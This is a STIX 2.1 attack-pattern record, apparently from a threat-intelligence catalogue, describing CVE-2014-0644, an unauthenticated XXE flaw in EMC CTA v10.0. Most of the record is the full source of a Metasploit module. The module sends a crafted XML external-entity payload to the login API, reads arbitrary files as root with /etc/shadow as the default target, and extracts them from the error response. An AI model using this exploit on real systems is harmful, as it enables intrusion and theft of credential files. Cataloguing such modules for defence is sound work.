{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--792a876e-b97f-41d8-a445-603dd67f6d9f",
    "created": "2024-08-14T16:31:40.836042Z",
    "modified": "2024-08-14T16:31:40.836046Z",
    "name": "EMC CTA v10.0 Unauthenticated XXE Arbitrary File Read",
    "description": " EMC CTA v10.0 is susceptible to an unauthenticated XXE attack that allows an attacker to read arbitrary files from the file system with the permissions of the root user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/emc_cta_xxe.rb",
            "external_id": "emc_cta_xxe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0644"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EMC CTA v10.0 Unauthenticated XXE Arbitrary File Read',\n      'Description'    => %q{\n      EMC CTA v10.0 is susceptible to an unauthenticated XXE attack\n      that allows an attacker to read arbitrary files from the file system\n      with the permissions of the root user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-0644'],\n          ['EDB', '32623']\n        ],\n      'DisclosureDate' => '2014-03-31'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('TARGETURI', [ true, \"Base directory path\", '/']),\n        OptString.new('FILEPATH', [true, \"The filepath to read on the server\", \"/etc/shadow\"]),\n      ]\n    )\n  end\n\n  def run\n\n    doctype = Rex::Text.rand_text_alpha(6)\n    element = Rex::Text.rand_text_alpha(6)\n    entity = Rex::Text.rand_text_alpha(6)\n\n    pay = %Q{<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE #{doctype} [\n<!ELEMENT #{element} ANY >\n<!ENTITY #{entity} SYSTEM \"file://#{datastore['FILEPATH']}\" >]>\n<Request>\n<Username>root</Username>\n<Password>&#{entity};</Password>\n</Request>\n    }\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'api', 'login'),\n      'method' => 'POST',\n      'data' => pay\n    })\n\n    if !res or !res.body\n      fail_with(Failure::UnexpectedReply, \"Server did not respond in an expected way\")\n    end\n\n    file = /For input string: \"(.*)\"/m.match(res.body)\n\n    if !file or file.length < 2\n      fail_with(Failure::UnexpectedReply, \"File was unretrievable. Was it a binary file?\")\n    end\n\n    file = file[1]\n\n    path = store_loot('emc.file', 'text/plain', datastore['RHOST'], file, datastore['FILEPATH'])\n\n    print_good(\"File saved to: \" + path)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-31"
}